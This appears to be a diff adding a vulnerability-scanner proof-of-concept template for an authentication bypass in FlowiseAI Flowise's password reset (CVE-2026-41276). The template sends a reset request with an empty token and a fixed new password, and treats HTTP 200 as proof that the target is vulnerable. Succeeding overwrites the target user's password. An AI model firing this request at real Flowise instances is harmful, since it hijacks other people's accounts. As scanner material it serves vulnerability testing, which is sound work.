@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 Flowise 密码重置认证绕过漏洞。向 /api/v1/account/reset-password 端点发送包含空令牌的伪造请求，尝试在不持有有效令牌的情况下重置目标用户密码。若返回 200 则表示漏洞存在。"
+id = "POC-AVE-2026-1003"
+name = "FlowiseAI Flowise 密码重置认证绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-1003"]
+vuln_id = [
+    "CVE-2026-41276",
+    "AVE-2026-1003",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/account/reset-password"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"email":"{{email}}","token":"","password":"Ave123456!"}'
+type = "json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
